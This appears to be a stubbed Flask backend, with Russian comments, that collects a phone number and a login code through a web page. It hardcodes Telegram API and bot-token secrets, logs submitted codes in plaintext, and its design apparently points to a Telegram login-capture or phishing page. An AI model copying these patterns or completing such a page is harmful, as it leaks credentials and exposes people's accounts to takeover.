import os
import json
import logging
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template
import requests

# ============================================================
# КОНФИГ
# ============================================================
API_ID = int(os.environ.get("API_ID", 37803152))
API_HASH = os.environ.get("API_HASH", "5d34acaeda36aa1a308e40ae31668795")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8690036172:AAGj9YweZMAdEm4tI5YTKJs_n1oAB-BN78c")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "8866175391").split(",") if x.strip()]

# ============================================================
# ЛОГИ
# ============================================================
os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("logs/app.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ============================================================
# FLASK
# ============================================================
app = Flask(__name__, template_folder="templates")

# ============================================================
# ХРАНИЛИЩЕ
# ============================================================
pending_auth = {}
rate_limiter = {}

def check_rate_limit(ip: str) -> bool:
    now = time.time()
    if ip in rate_limiter:
        if now - rate_limiter[ip] < 2.0:
            return False
    rate_limiter[ip] = now
    return True

# ============================================================
# МАРШРУТЫ — УПРОЩЁННЫЕ (БЕЗ ASYNCIO)
# ============================================================
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/auth/send", methods=["POST"])
def send_code():
    """Отправка кода — упрощённая версия"""
    data = request.json
    ip = request.remote_addr
    
    if not check_rate_limit(ip):
        return jsonify({"status": "error", "message": "Too many attempts"}), 429
    
    phone = data.get("phone", "").strip()
    if not phone or len(phone) < 10:
        return jsonify({"status": "error", "message": "Invalid phone"}), 400
    
    logger.info(f"Send code request for {phone}")
    
    # ВРЕМЕННО — ВОЗВРАЩАЕМ УСПЕШНЫЙ ОТВЕТ ДЛЯ ТЕСТА
    return jsonify({
        "status": "ok",
        "message": "Code sent (test mode)"
    })

@app.route("/api/auth/verify", methods=["POST"])
def verify_code():
    """Проверка кода — упрощённая версия"""
    data = request.json
    phone = data.get("phone", "").strip()
    code = data.get("code", "").strip()
    
    logger.info(f"Verify code for {phone}: {code}")
    
    # ВРЕМЕННО — ВОЗВРАЩАЕМ УСПЕШНЫЙ ОТВЕТ ДЛЯ ТЕСТА
    return jsonify({
        "status": "ok",
        "message": "Access granted (test mode)",
        "user": {
            "id": 123456789,
            "username": "test_user",
            "phone": phone
        }
    })

@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    logger.info(f"Starting Flask on port {port}")
    app.run(host="0.0.0.0", port=port, debug=False)